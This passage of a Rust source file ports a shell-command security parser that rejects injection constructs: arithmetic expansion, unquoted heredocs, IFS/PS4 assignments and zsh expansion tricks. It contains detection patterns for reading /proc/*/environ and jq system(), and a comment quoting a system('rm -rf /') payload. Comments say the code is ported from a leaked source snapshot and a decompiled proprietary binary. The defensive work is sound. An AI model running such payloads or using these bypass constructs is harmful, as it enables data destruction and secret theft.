                        .to_string(),
                });
            }
            return Ok(inner);
        }
    }
    Ok(result)
}

/// TS `walkArithmetic` (ast.ts:1675). Validate an `arithmetic_expansion` node:
/// only literal numeric expressions (no variables, no substitutions). `None` =
/// safe; `Some(TooComplex)` = reject (arithmetic injection defense). The caller
/// stores the full `$((…))` span as a literal argv string on success.
#[allow(dead_code)]
pub(crate) fn walk_arithmetic(node: Node, src: &[u8]) -> Option<ParseForSecurityResult> {
    for child in children(node) {
        if children(child).is_empty() {
            let t = node_text(child, src);
            if !arith_leaf_re().is_match(t) {
                return Some(ParseForSecurityResult::TooComplex {
                    reason: format!("Arithmetic expansion references variable or non-literal: {t}"),
                });
            }
            continue;
        }
        match child.kind() {
            "binary_expression"
            | "unary_expression"
            | "ternary_expression"
            | "parenthesized_expression" => {
                if let Some(err) = walk_arithmetic(child, src) {
                    return Some(err);
                }
            }
            _ => return Some(too_complex(child)),
        }
    }
    None
}

/// TS `extractSafeCatHeredoc` (ast.ts:1721). Is `sub_node` exactly
/// `$(cat <<'DELIM' … DELIM)`? Returns the body if so, [`CatHeredoc::Dangerous`]
/// on a `/proc/*/environ` or jq `system(` body, else [`CatHeredoc::None`].
#[allow(dead_code)]
pub(crate) fn extract_safe_cat_heredoc(sub_node: Node, src: &[u8]) -> CatHeredoc {
    // Expect exactly: $( + one redirected_statement + )
    let mut stmt: Option<Node> = None;
    for child in children(sub_node) {
        if matches!(child.kind(), "$(" | ")") {
            continue;
        }
        if child.kind() == "redirected_statement" && stmt.is_none() {
            stmt = Some(child);
        } else {
            return CatHeredoc::None;
        }
    }
    let stmt = match stmt {
        Some(s) => s,
        None => return CatHeredoc::None,
    };

    let mut saw_cat = false;
    let mut body: Option<String> = None;
    for child in children(stmt) {
        match child.kind() {
            "command" => {
                let cmd_children = children(child);
                if cmd_children.len() != 1 {
                    return CatHeredoc::None;
                }
                let name_node = cmd_children[0];
                if name_node.kind() != "command_name" || node_text(name_node, src) != "cat" {
                    return CatHeredoc::None;
                }
                saw_cat = true;
            }
            "heredoc_redirect" => {
                if walk_heredoc_redirect(child, src).is_some() {
                    return CatHeredoc::None;
                }
                for hc in children(child) {
                    if hc.kind() == "heredoc_body" {
                        body = Some(node_text(hc, src).to_string());
                    }
                }
            }
            _ => return CatHeredoc::None,
        }
    }

    let body = match (saw_cat, body) {
        (true, Some(b)) => b,
        _ => return CatHeredoc::None,
    };
    if proc_environ_re().is_match(&body) {
        return CatHeredoc::Dangerous;
    }
    if jq_system_re().is_match(&body) {
        return CatHeredoc::Dangerous;
    }
    // 2.1.211: the awk program battery also runs over the heredoc body, so a
    // `$(cat <<'EOF' … system("rm -rf /") … EOF)` fed to awk is caught.
    if yvc_awk_program(&body).is_some() {
        return CatHeredoc::Dangerous;
    }
    CatHeredoc::Body(body)
}

/// TS `walkVariableAssignment` (ast.ts:1777). Extract a `name=value` / `+=`
/// assignment, validating the name and the PS4/IFS/tilde fail-closed guards.
/// `Ok(VarAssign)` = the assignment; `Err(TooComplex)` = reject.
#[allow(dead_code)]
pub(crate) fn walk_variable_assignment(
    node: Node,
    inner_commands: &mut Vec<SimpleCommand>,
    var_scope: &mut HashMap<String, String>,
    src: &[u8],
) -> Result<VarAssign, ParseForSecurityResult> {
    let mut name: Option<String> = None;
    let mut value = String::new();
    let mut is_append = false;

    for child in children(node) {
        match child.kind() {
            "variable_name" => name = Some(node_text(child, src).to_string()),
            "=" | "+=" => {
                is_append = child.kind() == "+=";
            }
            "command_substitution" => {
                if let Some(err) =
                    collect_command_substitution(child, inner_commands, var_scope, src)
                {
                    return Err(err);
                }
                value = CMDSUB_PLACEHOLDER.to_string();
            }
            // RHS of an assignment does NOT word-split/glob → resolve as if inside
            // a string so BARE_VAR_UNSAFE_RE doesn't over-reject.
            "simple_expansion" => {
                value = resolve_simple_expansion(child, src, var_scope, true)?;
            }
            _ => {
                value = walk_argument(Some(child), src, inner_commands, var_scope)?;
            }
        }
    }

    let name = match name {
        Some(n) => n,
        None => {
            return Err(ParseForSecurityResult::TooComplex {
                reason: "Variable assignment without name".to_string(),
            })
        }
    };
    // SECURITY: tree-sitter accepts invalid names (e.g. `1VAR=value`) bash runs as
    // a COMMAND — must not treat as inert assignment.
    if !valid_var_name_re().is_match(&name) {
        return Err(ParseForSecurityResult::TooComplex {
            reason: format!("Invalid variable name (bash treats as command): {name}"),
        });
    }
    // SECURITY: IFS changes word-splitting — cannot model statically.
    if name == "IFS" {
        return Err(ParseForSecurityResult::TooComplex {
            reason: "IFS assignment changes word-splitting — cannot model statically".to_string(),
        });
    }
    // SECURITY: PS4 is expanded at trace time after `set -x` — allowlist only.
    // 2.1.211 applies the same battery to PROMPT4 (the zsh alias for PS4, so
    // `PROMPT4='$(cmd)'` + xtrace executes). Reason strings keep the "PS4"
    // wording even for PROMPT4, matching CC.
    if name == "PS4" || name == "PROMPT4" {
        if is_append {
            return Err(ParseForSecurityResult::TooComplex {
                reason:
                    "PS4 += cannot be statically verified — combine into a single PS4= assignment"
                        .to_string(),
            });
        }
        if contains_any_placeholder(&value) {
            return Err(ParseForSecurityResult::TooComplex {
                reason: "PS4 value derived from cmdsub/variable — runtime unknowable".to_string(),
            });
        }
        let stripped = ps4_dollar_brace_re().replace_all(&value, "");
        if !ps4_charset_re().is_match(&stripped) {
            return Err(ParseForSecurityResult::TooComplex {
                reason:
                    "PS4 value outside safe charset — only ${VAR} refs and [A-Za-z0-9 _+:.=/[]-] allowed"
                        .to_string(),
            });
        }
    }
    // SECURITY: tilde may expand at assignment time — reject any `~` in value.
    if value.contains('~') {
        return Err(ParseForSecurityResult::TooComplex {
            reason: "Tilde in assignment value — bash may expand at assignment time".to_string(),
        });
    }
    Ok(VarAssign {
        name,
        value,
        is_append,
    })
}

/// TS `walkHeredocRedirect` (ast.ts:1143). Only quoted-delimiter heredocs
/// (`<<'EOF'`) are safe (literal body). `None` = ok; `Some(TooComplex)` = reject.
/// ALL unquoted heredocs reject (tree-sitter grammar gap: backticks in an
/// unquoted body are not parsed as command_substitution but bash executes them).
#[allow(dead_code)]
pub(crate) fn walk_heredoc_redirect(node: Node, src: &[u8]) -> Option<ParseForSecurityResult> {
    let mut start_text: Option<String> = None;
    let mut body: Option<Node> = None;
    for child in children(node) {
        match child.kind() {
            "heredoc_start" => start_text = Some(node_text(child, src).to_string()),
            "heredoc_body" => body = Some(child),
            "<<" | "<<-" | "heredoc_end" | "file_descriptor" => {}
            _ => return Some(too_complex(child)),
        }
    }
    let is_quoted = start_text.as_deref().is_some_and(|s| {
        (s.starts_with('\'') && s.ends_with('\''))
            || (s.starts_with('"') && s.ends_with('"'))
            || s.starts_with('\\')
    });
    if !is_quoted {
        return Some(ParseForSecurityResult::TooComplex {
            reason: "Heredoc with unquoted delimiter undergoes shell expansion".to_string(),
        });
    }
    if let Some(b) = body {
        for hc in children(b) {
            if hc.kind() != "heredoc_content" {
                return Some(too_complex(hc));
            }
        }
    }
    None
}

/// TS `walkHerestringRedirect` (ast.ts:1211). `<<< content` — content is stdin,
/// not argv; validate it's statically resolvable (discard the string) and reject
/// a `\n…#` pattern (NEWLINE_HASH invariant). `None` = ok.
#[allow(dead_code)]
pub(crate) fn walk_herestring_redirect(
    node: Node,
    src: &[u8],
    inner_commands: &mut Vec<SimpleCommand>,
    var_scope: &mut HashMap<String, String>,
) -> Option<ParseForSecurityResult> {
    for child in children(node) {
        if child.kind() == "<<<" {
            continue;
        }
        match walk_argument(Some(child), src, inner_commands, var_scope) {
            Ok(content) => {
                if newline_hash_re().is_match(&content) {
                    return Some(too_complex(child));
                }
            }
            Err(e) => return Some(e),
        }
    }
    None
}

/// TS `walkTestExpr` (ast.ts:962). Walk a `[[ … ]]` test-expression subtree,
/// pushing operator tokens / operands onto `argv`. `None` = ok; operand
/// validation propagates any [`walk_argument`] too-complex.
#[allow(dead_code)]
pub(crate) fn walk_test_expr(
    node: Node,
    src: &[u8],
    argv: &mut Vec<String>,
    inner_commands: &mut Vec<SimpleCommand>,
    var_scope: &mut HashMap<String, String>,
) -> Option<ParseForSecurityResult> {
    match node.kind() {
        "unary_expression"
        | "binary_expression"
        | "negated_expression"
        | "parenthesized_expression" => {
            for c in children(node) {
                if let Some(err) = walk_test_expr(c, src, argv, inner_commands, var_scope) {
                    return Some(err);
                }
            }
            None
        }
        "test_operator" | "!" | "(" | ")" | "&&" | "||" | "==" | "=" | "!=" | "<" | ">" | "=~" => {
            let text = node_text(node, src);
            if let Some(reason) = test_expr_operator_reason(text) {
                return Some(ParseForSecurityResult::TooComplex {
                    reason: reason.to_string(),
                });
            }
            argv.push(text.to_string());
            None
        }
        "regex" | "extglob_pattern" => {
            let text = node_text(node, src);
            if let Some(reason) = test_expr_pattern_reason(node.kind(), text) {
                return Some(ParseForSecurityResult::TooComplex { reason });
            }
            argv.push(text.to_string());
            None
        }
        _ => match walk_argument(Some(node), src, inner_commands, var_scope) {
            Ok(s) => {
                if let Some(reason) = test_expr_leaf_reason(&s) {
                    return Some(ParseForSecurityResult::TooComplex {
                        reason: reason.to_string(),
                    });
                }
                argv.push(s);
                None
            }
            Err(e) => Some(e),
        },
    }
}

/// Mask `{` characters inside single-/double-quoted spans (TS
/// `maskBracesInQuotedContexts`, `ast.ts:331`). A single-pass bash-aware quote
/// scanner: `'` toggles single-quote only when unquoted; `"` toggles
/// double-quote only outside single quotes; `\` escapes the next char (unquoted)
/// or `"`/`\` (inside double quotes). `{` inside a quote → space.
#[must_use]
fn mask_braces_in_quoted_contexts(cmd: &str) -> String {
    if !cmd.contains('{') {
        return cmd.to_string();
    }
    let chars: Vec<char> = cmd.chars().collect();
    let mut out = String::with_capacity(cmd.len());
    let mut in_single = false;
    let mut in_double = false;
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        if in_single {
            if c == '\'' {
                in_single = false;
            }
            out.push(if c == '{' { ' ' } else { c });
            i += 1;
        } else if in_double {
            if c == '\\' && i + 1 < chars.len() && (chars[i + 1] == '"' || chars[i + 1] == '\\') {
                out.push(c);
                out.push(chars[i + 1]);
                i += 2;
            } else {
                if c == '"' {
                    in_double = false;
                }
                out.push(if c == '{' { ' ' } else { c });
                i += 1;
            }
        } else if c == '\\' && i + 1 < chars.len() {
            out.push(c);
            out.push(chars[i + 1]);
            i += 2;
        } else {
            if c == '\'' {
                in_single = true;
            } else if c == '"' {
                in_double = true;
            }
            out.push(c);
            i += 1;
        }
    }
    out
}

/// The pre-check gate of `parseForSecurityFromAst` (`ast.ts:408-437`): the
/// regex differentials that run BEFORE trusting tree-sitter. Returns the
/// byte-faithful `too-complex` reason when one fires, else `None` (proceed to
/// AST extraction). The reason strings are 1:1 with the TS.
#[must_use]
pub fn pre_check_too_complex(cmd: &str) -> Option<&'static str> {
    if control_char_re().is_match(cmd) {
        return Some("Contains control characters");
    }
    if unicode_whitespace_re().is_match(cmd) {
        return Some("Contains Unicode whitespace");
    }
    if backslash_whitespace_re().is_match(cmd) {
        return Some("Contains backslash-escaped whitespace");
    }
    if zsh_tilde_bracket_re().is_match(cmd) {
        return Some("Contains zsh ~[ dynamic directory syntax");
    }
    if zsh_equals_expansion_re().is_match(cmd) {
        return Some("Contains zsh =cmd equals expansion");
    }
    if zsh_numeric_range_re().is_match(cmd) {
        return Some("Contains zsh <N-M> numeric-range glob");
    }
    if brace_with_quote_re().is_match(&mask_braces_in_quoted_contexts(cmd)) {
        return Some("Contains brace with quote character (expansion obfuscation)");
    }
    None
}

/// Parse a bash command and extract a flat list of simple commands for security
/// analysis (TS `parseForSecurity` / `parseForSecurityFromAst`).
///
/// Empty → `Simple{[]}`; a pre-check differential → `TooComplex`; parser
/// unavailable / over-length → `ParseUnavailable` (the caller keeps the legacy
/// battery); otherwise the AST is walked via [`walk_program`] →
/// `Simple{commands}` | `TooComplex{reason}`. The security asymmetry holds: any
/// unhandled/ambiguous node fails closed (over-ask), never silently `Simple`.
#[must_use]
pub fn parse_for_security(cmd: &str) -> ParseForSecurityResult {
    parse_for_security_internal(cmd, false).0
}

/// Parse once for permission evaluation while retaining Native `getPipeSegments`
/// boundaries from the same tree-sitter tree. This keeps AST command spans for
/// the general `a6t` path and byte-exact pipeline segments for the `m6o` path.
pub(crate) fn parse_for_security_with_pipeline_segments(
    cmd: &str,
) -> (ParseForSecurityResult, Option<Vec<String>>) {
    parse_for_security_internal(cmd, true)
}

fn parse_for_security_internal(
    cmd: &str,
    collect_pipeline_segments: bool,
) -> (ParseForSecurityResult, Option<Vec<String>>) {
    // TS: `if (cmd === '') return { kind: 'simple', commands: [] }`.
    if cmd.is_empty() {
        return (
            ParseForSecurityResult::Simple {
                commands: Vec::new(),
            },
            None,
        );
    }
    // Pre-checks run before trusting tree-sitter (the known differentials).
    if let Some(reason) = pre_check_too_complex(cmd) {
        return (
            ParseForSecurityResult::TooComplex {
                reason: reason.to_string(),
            },
            None,
        );
    }
    // TS `parseForSecurity`: `root === null => parse-unavailable`. Over-length /
    // unparseable → `parse_raw` returns `None` → `ParseUnavailable` (the caller
    // keeps the legacy battery), exactly like TS — NOT routed to `TooComplex`.
    let tree = match crate::bash_tree_sitter::parse_raw(cmd) {
        Some(t) => t,
        None => return (ParseForSecurityResult::ParseUnavailable, None),
    };
    // TS: `const trimmed = cmd.trim(); if (trimmed === '') return simple[]`.
    if cmd.trim().is_empty() {
        return (
            ParseForSecurityResult::Simple {
                commands: Vec::new(),
            },
            None,
        );
    }
    // DEFER (PARSE_ABORTED): TS fail-CLOSES (`TooComplex`, nodeType `PARSE_ABORT`,
    // reason "Parser aborted (timeout or resource limit) — possible adversarial
    // input") when the parse hits the node/time budget. tree-sitter-bash 0.25.1
    // here has no budget (see `bash_tree_sitter::parse_raw`), so that branch is
    // UNREACHABLE today; wire it only if a parse-timeout API is added — and use
    // the real 2.1.195 binary string then, which is NEWER than the TS source.
    let parsed = walk_program(tree.root_node(), cmd.as_bytes());
    if matches!(
        &parsed,
        ParseForSecurityResult::TooComplex { reason } if reason == "Parse error"
    ) {
        if let Some((completed_tree, completed_source)) =
            complete_terminal_incomplete_if(&tree, cmd)
        {
            // The completed tree is structural only. Every command-like span is
            // checked to remain within the caller's original bytes, and pipeline
            // segments are sliced from those original bytes below.
            let completed = walk_program(completed_tree.root_node(), completed_source.as_bytes());
            if matches!(completed, ParseForSecurityResult::Simple { .. }) {
                let pipeline_segments = collect_pipeline_segments
                    .then(|| native_pipeline_segments(completed_tree.root_node(), cmd.as_bytes()))
                    .flatten();
                return (completed, pipeline_segments);
            }
        }
    }
    let pipeline_segments = collect_pipeline_segments
        .then(|| native_pipeline_segments(tree.root_node(), cmd.as_bytes()))
        .flatten();
    (parsed, pipeline_segments)
}

#[derive(Default)]
struct IfCompletionFacts {
    errors: Vec<(usize, usize)>,
    errors_at_eof: usize,
    missing_count: usize,
    if_statements: usize,
    if_tokens: usize,
    then_tokens: usize,
    real_fi_tokens: usize,
    open_if_statements: usize,
    malformed_if_shape: bool,
    command_span_outside_original: bool,
    synthetic_fi: Vec<usize>,
    synthetic_if_closing_fi: Vec<usize>,
}

fn inspect_if_completion_tree(node: Node, original_len: usize, facts: &mut IfCompletionFacts) {
    if node.is_error() {
        facts.errors.push((node.start_byte(), node.end_byte()));
        if node.end_byte() == original_len {
            facts.errors_at_eof += 1;
        }
    }
    if node.is_missing() {
        facts.missing_count += 1;
    }
    match node.kind() {
        "if" => facts.if_tokens += 1,
        "then" => facts.then_tokens += 1,
        "fi" if !node.is_missing() => {
            facts.real_fi_tokens += 1;
            if node.start_byte() >= original_len {
                facts.synthetic_fi.push(node.start_byte());
            }
        }
        _ => {}
    }
    if matches!(
        node.kind(),
        "command"
            | "variable_assignment"
            | "declaration_command"
            | "unset_command"
            | "test_command"
    ) && node.end_byte() > original_len
    {
        facts.command_span_outside_original = true;
    }
    if node.kind() == "if_statement" {
        facts.if_statements += 1;
        let direct = children(node);
        let direct_ifs = direct.iter().filter(|child| child.kind() == "if").count();
        let direct_thens = direct.iter().filter(|child| child.kind() == "then").count();
        let direct_fis = direct
            .iter()
            .filter(|child| child.kind() == "fi" && !child.is_missing())
            .collect::<Vec<_>>();
        if direct_ifs != 1 || direct_thens != 1 || direct_fis.len() > 1 {
            facts.malformed_if_shape = true;
        }
        if direct_fis.is_empty() {
            facts.open_if_statements += 1;
        }
        for fi in direct_fis {
            if fi.start_byte() >= original_len {
                facts.synthetic_if_closing_fi.push(fi.start_byte());
            }
        }
    }
    for child in children(node) {
        inspect_if_completion_tree(child, original_len, facts);
    }
}

/// Repair only a uniquely terminal, whole-input ERROR around complete EOF
/// `if`/`then` structures. The number of `fi` tokens comes from Host AST
/// terminals, never text keywords or the Native parser's counts. The augmented
/// tree is accepted only when its real closing tokens close every `if_statement`
/// and no command-like span crosses the original source boundary.
fn complete_terminal_incomplete_if(tree: &Tree, command: &str) -> Option<(Tree, String)> {
    let original_len = command.len();
    let root = tree.root_node();
    if !matches!(root.kind(), "program" | "ERROR")
        || root.start_byte() != 0
        || root.end_byte() != original_len
        || !root.has_error()
    {
        return None;
    }
    let mut base = IfCompletionFacts::default();
    inspect_if_completion_tree(root, original_len, &mut base);
    let open_if_count = base.if_tokens.checked_sub(base.real_fi_tokens)?;
    if base.errors.len() != 1
        || base.errors_at_eof != 1
        || base.missing_count != 0
        || open_if_count == 0
        || base.if_statements != base.real_fi_tokens
        || base.then_tokens < base.if_tokens
        || base.malformed_if_shape
        || base.command_span_outside_original
    {
        return None;
    }

    // The base ERROR subtree retains AST `if`/`then` terminals even when it
    // cannot form an `if_statement`; count only those parser terminals (minus
    // already-structured real `fi` terminals), never raw command keywords.
    // One extra parse is bounded by parse_raw's existing UTF-16 input cap. There
    // is no retry loop or new arbitrary nesting limit.
    let suffix = "\nfi".repeat(open_if_count);
    let (completed_tree, completed_source) =
        crate::bash_tree_sitter::parse_raw_with_internal_suffix(command, &suffix)?;
    let completed_root = completed_tree.root_node();
    let mut completed = IfCompletionFacts::default();
    inspect_if_completion_tree(completed_root, original_len, &mut completed);
    let mut all_synthetic_fi = completed.synthetic_fi.clone();
    all_synthetic_fi.sort_unstable();
    let mut closing_synthetic_fi = completed.synthetic_if_closing_fi.clone();
    closing_synthetic_fi.sort_unstable();
    if completed_root.kind() != "program"
        || completed_root.start_byte() != 0
        || completed_root.end_byte() != completed_source.len()
        || completed_root.has_error()
        || !completed.errors.is_empty()
        || completed.missing_count != 0
        || completed.if_statements == 0
        || completed.if_tokens != completed.if_statements
        || completed.then_tokens < completed.if_statements
        || completed.real_fi_tokens != completed.if_statements
        || completed.open_if_statements != 0
        || completed.malformed_if_shape
        || completed.command_span_outside_original
        || all_synthetic_fi != closing_synthetic_fi
        || all_synthetic_fi.len() != open_if_count
    {
        return None;
    }
    Some((completed_tree, completed_source))
}

/// Native `cYo` walks every pipeline node, records the byte spans of its `|` /
/// `|&` operator tokens, sorts those spans, then `getPipeSegments` slices the
/// original UTF-8 command around them. Preserve that source-level behavior so a
/// later permission walk can select the pipeline producer without reparsing or
/// guessing from shell text.
fn native_pipeline_segments(root: Node, src: &[u8]) -> Option<Vec<String>> {
    fn collect(node: Node, positions: &mut Vec<(usize, usize)>) {
        if node.kind() == "pipeline" {
            for child in children(node) {
                if child.kind() == "|" || child.kind() == "|&" {
                    positions.push((child.start_byte(), child.end_byte()));
                }
            }
        }
        for child in children(node) {
            collect(child, positions);
        }
    }

    let mut positions = Vec::new();
    collect(root, &mut positions);
    if positions.is_empty() {
        return None;
    }
    positions.sort_unstable_by_key(|(start, _)| *start);

    let mut segments = Vec::new();
    let mut cursor = 0usize;
    for (start, end) in positions {
        if start < cursor || end < start || end > src.len() {
            return None;
        }
        let segment = std::str::from_utf8(&src[cursor..start]).ok()?.trim();
        if !segment.is_empty() {
            segments.push(segment.to_string());
        }
        cursor = end;
    }
    let tail = std::str::from_utf8(&src[cursor..]).ok()?.trim();
    if !tail.is_empty() {
        segments.push(tail.to_string());
    }
    Some(segments)
}

/// TS `walkProgram` (ast.ts:462). Drive [`collect_commands`] over the program
/// root with a fresh `var_scope`. The ERROR-node check is folded into
/// `collect_commands` — any unhandled node type (including `ERROR`) falls through
/// to `too_complex` in the default branch. `Simple{commands}` on success;
/// the propagated `TooComplex` otherwise.
#[must_use]
pub fn walk_program(root: Node, src: &[u8]) -> ParseForSecurityResult {
    if let Some(reason) = validate_top_level_program_layout(root, src) {
        return ParseForSecurityResult::TooComplex {
            reason: reason.to_string(),
        };
    }
    let mut commands: Vec<SimpleCommand> = Vec::new();
    let mut var_scope: HashMap<String, String> = HashMap::new();
    if let Some(err) = collect_commands(root, &mut commands, &mut var_scope, src) {
        return err;
    }
    ParseForSecurityResult::Simple { commands }
}

fn validate_top_level_coverage(spans: &[(usize, usize)], src: &[u8]) -> Option<&'static str> {
    let mut cursor = 0usize;
    for &(start, end) in spans {
        if start > src.len() || end > src.len() || start > end {
            return Some("Parser skipped input between top-level statements");
        }
        if start > cursor && !is_allowed_layout_gap(&src[cursor..start]) {
            return Some("Parser skipped input between top-level statements");
        }
        if end > cursor {
            cursor = end;
        }
    }
    if !is_allowed_layout_gap(&src[cursor..]) {
        return Some("Parser did not consume trailing input");
    }
    None
}

fn is_allowed_layout_gap(bytes: &[u8]) -> bool {
    let mut i = 0usize;
    while i < bytes.len() {
        match bytes[i] {
            b' ' | b'\t' | b'\n' | b'\r' | b';' | b'&' => i += 1,
            b'\\' if i + 1 < bytes.len() && bytes[i + 1] == b'\n' => i += 2,
            b'\\' if i + 2 < bytes.len() && bytes[i + 1] == b'\r' && bytes[i + 2] == b'\n' => {
                i += 3
            }
            _ => return false,
        }
    }
    true
}

fn gap_is_same_line_after_continuations(bytes: &[u8]) -> bool {
    let mut i = 0usize;
    while i < bytes.len() {
        match bytes[i] {
            b'\\' if i + 1 < bytes.len() && bytes[i + 1] == b'\n' => i += 2,
            b'\\' if i + 2 < bytes.len() && bytes[i + 1] == b'\r' && bytes[i + 2] == b'\n' => {
                i += 3
            }
            b'\n' | b'\r' => return false,
            _ => i += 1,
        }
    }
    true
}

fn unwrap_statement_candidate(node: Node) -> Node {
    let mut cur = node;
    loop {
        let next = match cur.kind() {
            "redirected_statement" => children(cur).into_iter().find(|child| {
                !matches!(
                    child.kind(),
                    "file_redirect"
                        | "heredoc_redirect"
                        | "herestring_redirect"
                        | "comment"
                        | ">"
                        | ">>"
                        | "<"
                        | ">&"
                        | "<&"
                        | ">|"
                        | "&>"
                        | "&>>"
                        | "<<<"
                )
            }),
            "negated_command" => children(cur).into_iter().find(|child| child.kind() != "!"),
            _ => None,
        };
        match next {
            Some(next) => cur = next,
            None => return cur,
        }
    }
}

fn is_statement_node_kind(kind: &str) -> bool {
    matches!(
        kind,
        "command"
            | "declaration_command"
            | "variable_assignment"
            | "unset_command"
            | "test_command"
            | "for_statement"
            | "while_statement"
            | "until_statement"
            | "if_statement"
            | "case_statement"
            | "function_definition"
            | "compound_statement"
            | "subshell"
            | "pipeline"
    )
}

fn validate_adjacent_statements_recursive(node: Node, src: &[u8]) -> Option<&'static str> {
    let mut prev_stmt: Option<Node> = None;
    for child in children(node) {
        let unwrapped = unwrap_statement_candidate(child);
        if is_statement_node_kind(unwrapped.kind()) {
            if let Some(prev) = prev_stmt {
                if let Some(reason) = validate_adjacent_statement_spans(
                    &[
                        (prev.start_byte(), prev.end_byte()),
                        (child.start_byte(), child.end_byte()),
                    ],
                    src,
                ) {
                    return Some(reason);
                }
            }
            prev_stmt = Some(child);
        } else {
            prev_stmt = None;
        }
        if let Some(reason) = validate_adjacent_statements_recursive(child, src) {
            return Some(reason);
        }
    }
    None
}

fn validate_adjacent_statement_spans(
    statement_spans: &[(usize, usize)],
    src: &[u8],
) -> Option<&'static str> {
    for pair in statement_spans.windows(2) {
        let prev_end = pair[0].1;
        let next_start = pair[1].0;
        if next_start <= src.len()
            && prev_end <= next_start
            && gap_is_same_line_after_continuations(&src[prev_end..next_start])
        {
            return Some(
                "statement directly follows another statement on the same line — bash reads the text as one command (`!` and shell keywords are plain words after an assignment), not two statements",
            );
        }
    }
    None
}

fn validate_top_level_program_layout(root: Node, src: &[u8]) -> Option<&'static str> {
    let all_spans: Vec<(usize, usize)> = children(root)
        .into_iter()
        .map(|child| (child.start_byte(), child.end_byte()))
        .collect();
    validate_top_level_coverage(&all_spans, src)
        .or_else(|| validate_adjacent_statements_recursive(root, src))
}

fn test_expr_operator_reason(text: &str) -> Option<&'static str> {
    if text.is_empty() {
        Some("Test command has a synthesized zero-width token — parser diverged from shell")
    } else {
        None
    }
}

fn test_expr_contains_expansion(text: &str) -> bool {
    let chars: Vec<char> = text.chars().collect();
    let mut i = 0usize;
    while i < chars.len() {
        match chars[i] {
            '`' => return true,
            '<' | '>' if chars.get(i + 1) == Some(&'(') => return true,
            '$' => {
                if let Some(next) = chars.get(i + 1) {
                    if matches!(
                        next,
                        '(' | '{'
                            | '['
                            | '#'
                            | '?'
                            | '!'
                            | '*'
                            | '@'
                            | '$'
                            | '\''
                            | '"'
                            | '+'
                            | '~'
                            | '^'
                            | '='
                            | '-'
                    ) || next.is_ascii_alphanumeric()
                        || *next == '_'
                    {
                        return true;
                    }
                }
            }
            _ => {}
        }
        i += 1;
    }
    false
}

fn test_expr_pattern_reason(kind: &str, text: &str) -> Option<String> {
    if text.contains("&&") {
        return Some(
            "[[ ]] pattern leaf contains `&&` — shell cond-lexer divergence (zsh splits the word there)"
                .to_string(),
        );
    }
    if test_expr_contains_expansion(text) {
        return Some(format!(
            "[[ ]] {kind} contains expansion / command / process substitution"
        ));
    }
    let chars: Vec<char> = text.chars().collect();
    let mut i = 0usize;
    let mut in_single = false;
    let mut in_double = false;
    let mut depth = 0i32;
    while i < chars.len() {
        let ch = chars[i];
        if ch == '\\' {
            i += 2;
            continue;
        }
        if !in_double && ch == '\'' {
            in_single = !in_single;
            i += 1;
            continue;
        }
        if !in_single && ch == '"' {
            in_double = !in_double;
            i += 1;
            continue;
        }
        if in_single || in_double {
            i += 1;
            continue;
        }
        if ch == '&' {
            return Some(match kind {
                "extglob_pattern" => {
                    "[[ ]] pattern contains unquoted & (zsh splits the word at & at any depth)"
                        .to_string()
                }
                "regex" => {
                    "[[ ]] regex contains unquoted & (zsh splits the word at & at any depth)"
                        .to_string()
                }
                _ => unreachable!("unexpected test expr pattern kind"),
            });
        }
        if kind == "regex" {
            if ch == '(' {
                depth += 1;
            } else if ch == ')' {
                depth -= 1;
                if depth < 0 {
                    return Some(
                        "[[ ]] regex has unbalanced parentheses (parser desync)".to_string(),
                    );
                }
            } else if ch == '|' && chars.get(i + 1) == Some(&'|') && depth == 0 {
                return Some(
                    "[[ ]] regex contains glued || (zsh splits it as a cond operator)".to_string(),
                );
            }
        }
        i += 1;
    }
    if kind == "regex" && depth != 0 {
        return Some("[[ ]] regex has unbalanced parentheses (parser desync)".to_string());
    }
    None
}

fn test_expr_leaf_reason(text: &str) -> Option<&'static str> {
    if text.contains("&&") {
        Some(
            "[[ ]] pattern leaf contains `&&` — shell cond-lexer divergence (zsh splits the word there)",
        )
    } else {
        None
    }
}

// ────────────────────────────────────────────────────────────────────────────
// L4: semantic safety check (`checkSemantics`).
//
// Faithful 1:1 port of `ast.ts` `checkSemantics` (2213-2680): the per-command
// name/argv-based safety battery that runs AFTER the AST extraction succeeds. It
// strips safe wrapper commands (time/nohup/timeout/nice/env/stdbuf) so the
// WRAPPED command is checked, then rejects eval-like builtins, subscript-eval
// builtins, /proc/*/environ access, newline-in-argv obfuscation, jq system()/
// dangerous flags, zsh dangerous builtins, shell-keyword-as-command, etc.
//
// SECURITY ASYMMETRY: every ambiguous wrapper-strip case fails CLOSED (Deny) so
// a wrapper can never hide the real command from the per-command checks.
//
// FOUNDATION ONLY: like [`parse_for_security`]'s walker, this has NO production
// caller yet — the behavior-flip that routes [`SemanticCheckResult::Deny`] into
// the permission decision is a deliberately deferred separate step. Hence the
// `#[allow(dead_code)]` (the tests below are its only consumers in a prod build).
//
// ⚠️ ORACLE = the 2.1.195 BINARY (not the leaked `claude-code/src`, which is an
// OLDER ≈2.1.83 snapshot whose `checkSemantics` is a strict SUBSET). This function
// is ported from the minified `checkSemantics`/`Mra` recovered from the 2.1.195
// binary's embedded bundle (`/Users/luolingfeng/.local/bin/claude`), so it is the
// FULL superset: path-aware wrapper strip incl. `command`/`builtin`/`noglob`;
// subscript-eval with `-t`; `[[ … ]]` non-numeric arith operands; the zsh-aware
// `read` flag machine; the declare/typeset/export/readonly/private/float/integer
// family; `printf`/`set -o`/`set -<letter>`/`print -P`/`jobs -x`; jq
// `include/import` + widened code/file flags; `find` action-primaries + unquoted
// globs; and the `watch`/`flock`/… runs-its-argument family. Branch ORDER and
// reason strings are byte-faithful to the binary; newline-`#` is DEFERRED (only
// returned if nothing else denied), exactly as the binary's `t??=` does.
// ────────────────────────────────────────────────────────────────────────────

/// Verdict of [`check_semantics`] (TS `SemanticCheckResult`, ast.ts:2206:
/// `{ ok: true } | { ok: false; reason: string }`).
#[derive(Debug, Clone, PartialEq, Eq)]
#[allow(dead_code)]
pub(crate) enum SemanticCheckResult {
    /// The command battery found nothing unsafe.
    Ok,
    /// An unsafe construct was found → the caller must ask. `reason` is
    /// byte-faithful to the TS reason string.
    Deny {
        /// Human-readable reason (byte-faithful to the TS).
        reason: String,
    },
}

/// TS `A1n` — render placeholder tokens for display inside reason strings.
#[allow(dead_code)]
fn a1n_display(s: &str) -> String {
    s.replace(CMDSUB_PLACEHOLDER, "$(\u{2026})")
        .replace(VAR_PLACEHOLDER, "${\u{2026}}")
}

/// TS `Prp` — true iff `text` contains an unquoted glob metacharacter (`*`, `?`,
/// `[`) outside single/double quotes, backticks, and `#` comments. A quote-aware
/// scan over the raw command text (used by the `find` battery).
